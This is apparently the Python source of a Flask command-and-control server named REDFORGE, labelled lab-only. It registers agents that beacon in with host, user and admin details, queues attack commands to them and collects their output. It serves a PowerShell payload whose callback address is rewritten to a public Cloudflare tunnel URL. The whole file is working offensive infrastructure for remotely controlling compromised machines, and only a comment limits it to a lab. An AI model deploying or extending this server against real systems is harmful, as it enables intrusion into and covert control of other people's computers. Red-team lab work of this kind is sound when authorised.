# server.py
# Lab-only C2 server. Run inside isolated network with participant consent.

from flask import Flask, request, jsonify, render_template, Response, send_from_directory
import datetime
import json
import os
import re

from payload_builder import payload_bp
from redteam_api import redteam_bp
from deployer import deployer_bp
from tunnel import tunnel_bp, current_url as tunnel_url

app = Flask(__name__, static_folder='static', template_folder='templates')
app.register_blueprint(payload_bp)
app.register_blueprint(redteam_bp)
app.register_blueprint(deployer_bp)
app.register_blueprint(tunnel_bp)

agents = {}
agent_results = {}
killed_agents = set()
KILL_FILE = "killed_agents.json"
TUNNEL_LOG = "logs/tunnel.log"

# ---------------- PERSISTENCE ----------------

def load_killed():
    global killed_agents
    if os.path.exists(KILL_FILE):
        try:
            with open(KILL_FILE, "r") as f:
                killed_agents = set(json.load(f))
            print(f"[i] Loaded {len(killed_agents)} killed agent IDs")
        except Exception as e:
            print(f"[!] Kill file error: {e}")

def save_killed():
    try:
        with open(KILL_FILE, "w") as f:
            json.dump(list(killed_agents), f)
    except Exception as e:
        print(f"[!] Save kill file error: {e}")

load_killed()

with open('abilities.json', 'r') as f:
    ABILITIES = json.load(f)['abilities']

def get_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ---------------- TUNNEL URL RESOLUTION ----------------

def _tunnel_url_from_log():
    """Read the most recent trycloudflare.com URL from logs/tunnel.log."""
    if not os.path.exists(TUNNEL_LOG):
        return None
    try:
        with open(TUNNEL_LOG, "r", errors="ignore") as f:
            content = f.read()
        matches = re.findall(r'https://[a-z0-9-]+\.trycloudflare\.com', content)
        if matches:
            return matches[-1]
    except Exception:
        pass
    return None


def _base_url():
    """
    Resolve the base URL the client should use for payload one-liners.
    Priority:
      1. In-memory tunnel started by the UI (/api/tunnel/start)
      2. Tunnel URL found in logs/tunnel.log (started by the rfg script)
      3. Request host (LAN fallback)
    """
    t = tunnel_url()
    if t:
        return t

    t = _tunnel_url_from_log()
    if t:
        return t

    if request.host.endswith('.trycloudflare.com'):
        return f"https://{request.host}"
    return f"http://{request.host}"


def _agent_base():
    """Same as _base_url but without the protocol scheme (for __C2__ substitution)."""
    url = _base_url()
    return url.replace("https://", "").replace("http://", "")


def _protocol():
    return "https" if _base_url().startswith("https://") else "http"


# ---------------- STATIC FILES ----------------

@app.route('/static/<path:path>')
def static_files(path):
    return send_from_directory('static', path)


# ---------------- MAIN PAGES ----------------

@app.route('/')
def dashboard():
    return render_template('dashboard.html',
                           agents=agents,
                           abilities=ABILITIES,
                           results=agent_results,
                           server_ip=request.host.split(':')[0],
                           base_url=_base_url())


@app.route('/favicon.ico')
def favicon():
    return '', 204


@app.route('/payload')
def payload():
    if not os.path.exists('payload.ps1'):
        return "Payload not found", 404
    with open('payload.ps1', 'r') as f:
        content = f.read()

    url = _base_url()
    protocol = "https" if url.startswith("https://") else "http"
    host = url.replace("https://", "").replace("http://", "")
    content = content.replace('http://192.168.1.100:8888', f'{protocol}://{host}')
    return Response(content, mimetype='text/plain')


# ---------------- BEACON + RESULTS ----------------

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.json or {}
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({"error": "no agent_id"}), 400

    if agent_id in killed_agents:
        print(f"[X] Killed agent {agent_id} beacon rejected")
        if agent_id in agents:
            agents[agent_id]["status"] = "killed"
        return jsonify({"action": "terminate"})

    if agent_id not in agents:
        agents[agent_id] = {
            "hostname": data.get('hostname', 'unknown'),
            "user": data.get('user', 'unknown'),
            "os": data.get('os', 'unknown'),
            "ip": data.get('ip', 'unknown'),
            "is_admin": data.get('is_admin', False),
            "first_seen": get_time(),
            "last_seen": get_time(),
            "queue": [],
            "status": "alive",
            "_deploy_overrides": {},
            "_last_results": {}
        }
        print(f"[+] New agent: {data.get('hostname')} ({agent_id})")
    else:
        agents[agent_id]["last_seen"] = get_time()
        agents[agent_id]["status"] = "alive"

    if agents[agent_id]["queue"]:
        tech_id = agents[agent_id]["queue"].pop(0)
        ability = ABILITIES.get(tech_id)
        if ability:
            host = _agent_base()
            protocol = _protocol()
            cmd = ability["cmd"].replace("__C2__", host)
            cmd = cmd.replace("http://__C2__", f"{protocol}://{host}")
            overrides = agents[agent_id].get("_deploy_overrides", {})
            if tech_id in overrides:
                cmd = overrides.pop(tech_id).replace("__C2__", host)
                cmd = cmd.replace("http://__C2__", f"{protocol}://{host}")
            print(f"[>] Sending {tech_id} to {agents[agent_id]['hostname']}")
            return jsonify({
                "technique": tech_id,
                "name": ability["name"],
                "cmd": cmd
            })

    return jsonify({"cmd": None})


@app.route('/results', methods=['POST'])
def results():
    data = request.json or {}
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({"error": "no agent_id"}), 400

    if agent_id not in agent_results:
        agent_results[agent_id] = []

    entry = {
        "technique": data.get('technique', 'unknown'),
        "output": data.get('output', ''),
        "status": data.get('status', 'success'),
        "time": get_time()
    }
    agent_results[agent_id].append(entry)

    if agent_id in agents:
        agents[agent_id].setdefault("_last_results", {})
        agents[agent_id]["_last_results"][entry["technique"]] = entry["output"]

    print(f"[OK] Result from {agent_id} ({entry['technique']})")
    return jsonify({"status": "ok"})


@app.route('/queue/<agent_id>/<tech_id>', methods=['POST'])
def queue_command(agent_id, tech_id):
    print(f"[Q] Queue: {agent_id} <- {tech_id}")
    if agent_id in killed_agents:
        return jsonify({"error": "agent is terminated"}), 400
    if agent_id not in agents:
        return jsonify({"error": "agent not found"}), 404
    if tech_id not in ABILITIES:
        return jsonify({"error": "technique not found"}), 404
    agents[agent_id]["queue"].append(tech_id)
    return jsonify({"status": "queued", "technique": tech_id})


@app.route('/terminate/<agent_id>', methods=['POST'])
def terminate_agent(agent_id):
    if agent_id in agents:
        killed_agents.add(agent_id)
        agents[agent_id]["status"] = "killed"
        save_killed()
        print(f"[!] Terminated agent {agent_id}")
        return jsonify({"status": "terminating"})
    return jsonify({"error": "not found"}), 404


@app.route('/terminate-all', methods=['POST'])
def terminate_all():
    count = 0
    for aid in list(agents.keys()):
        if agents[aid]["status"] == "alive":
            killed_agents.add(aid)
            agents[aid]["status"] = "killed"
            count += 1
    save_killed()
    return jsonify({"status": "ok", "count": count})


@app.route('/clear-killed', methods=['POST'])
def clear_killed():
    global killed_agents
    killed_agents = set()
    if os.path.exists(KILL_FILE):
        os.remove(KILL_FILE)
    return jsonify({"status": "ok"})


@app.route('/clear-results', methods=['POST'])
def clear_results():
    agent_results.clear()
    return jsonify({"status": "ok"})


@app.route('/api/state')
def api_state():
    return jsonify({
        "agents": agents,
        "results": agent_results,
        "killed": list(killed_agents),
        "tunnel_url": _base_url(),
        "base_url": _base_url()
    })


# ---------------- MAIN ----------------

if __name__ == '__main__':
    print("=" * 60)
    print("  REDFORGE - Lab Command & Control")
    print("  Dashboard: http://0.0.0.0:8888")
    if _tunnel_url_from_log():
        print(f"  Tunnel   : {_tunnel_url_from_log()}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=8888, debug=False)
